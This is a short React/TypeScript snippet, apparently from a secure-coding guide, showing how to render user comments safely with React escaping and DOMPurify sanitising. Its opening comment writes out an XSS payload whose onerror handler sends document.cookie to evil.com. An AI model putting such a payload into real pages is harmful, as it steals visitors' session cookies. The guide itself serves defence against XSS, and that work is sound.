// An attacker submits this as their comment body:
// <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

import DOMPurify from "dompurify";

// Option 1: Let React handle escaping (preferred for plain text)
function Comment({ comment }: { comment: { body: string } }) {
  // React automatically escapes this -- no XSS possible
  return <div className="comment">{comment.body}</div>;
}

// Option 2: When you need to render rich HTML (e.g., from a markdown editor)
function RichComment({ comment }: { comment: { html: string } }) {
  // DOMPurify strips dangerous tags and attributes
  const sanitized = DOMPurify.sanitize(comment.html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "li"],
    ALLOWED_ATTR: ["href", "target", "rel"],
  });

  return (
    <div
      className="comment"
      dangerouslySetInnerHTML={{ __html: sanitized }}
    />
  );
}
